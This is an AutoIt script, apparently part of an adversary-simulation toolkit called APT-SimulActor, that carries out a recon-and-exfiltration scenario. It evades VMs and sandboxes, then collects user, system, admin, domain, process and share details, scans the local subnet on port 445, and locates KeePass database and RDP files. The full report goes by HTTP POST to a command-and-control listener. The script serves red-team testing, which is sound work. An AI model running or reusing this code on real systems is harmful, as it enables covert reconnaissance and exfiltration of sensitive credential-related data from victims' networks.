#include "..\APT-SimulActor.au3"

; CAUTION: The APT-SimulActor use requires authorization from proper stakeholders.
; Author and Contributors will not be responsible for the malfunctioning or weaponization of the tool.

; Recon and exfiltration scenario.

Local $sC2Host = "192.0.2.10"   ; replace with listener IP
Local $sC2Port = "8080"

If DetectVM()               Then Exit
If Not DetectSandboxSleep() Then Exit
If Not DetectSandboxMouse() Then Exit

Local $sUser = GetCurrentUser()
If GetLoginCount($sUser) <= 2 Then Exit

Local $sReport  = "[USER]"          & @CRLF & $sUser                & @CRLF & @CRLF
$sReport       &= "[SYSINFO]"       & @CRLF & GetSystemInfo()       & @CRLF
$sReport       &= "[LOCAL ADMINS]"  & @CRLF & GetLocalAdmins()      & @CRLF
$sReport       &= "[DOMAIN INFO]"   & @CRLF & GetDomainInfo()       & @CRLF
$sReport       &= "[DOMAIN ADMINS]" & @CRLF & GetDomainAdmins()     & @CRLF
$sReport       &= "[PROCESSES]"     & @CRLF & GetRunningProcesses() & @CRLF
$sReport       &= "[SHARES]"        & @CRLF & GetSharedResources()  & @CRLF

Local $aLiveHosts = ScanSubnet(445, 1, 254)
If IsArray($aLiveHosts) Then
   $sReport &= "[LIVE HOSTS: " & $aLiveHosts[0] & "]" & @CRLF
   For $i = 1 To $aLiveHosts[0]
      $sReport &= "  " & $aLiveHosts[$i] & @CRLF
   Next
EndIf

Local $aKeePass = FindFiles(@UserProfileDir, "*.kdbx")
If IsArray($aKeePass) Then
   $sReport &= "[KEEPASS FILES: " & $aKeePass[0] & "]" & @CRLF
   For $i = 1 To $aKeePass[0]
      $sReport &= "  " & $aKeePass[$i] & @CRLF
   Next
EndIf

Local $aRdpFiles = FindFiles(@UserProfileDir, "*.rdp")
If IsArray($aRdpFiles) Then
   $sReport &= "[RDP FILES: " & $aRdpFiles[0] & "]" & @CRLF
   For $i = 1 To $aRdpFiles[0]
      $sReport &= "  " & $aRdpFiles[$i] & @CRLF
   Next
EndIf

HttpPost($sC2Host, "report", $sC2Port, $sReport)
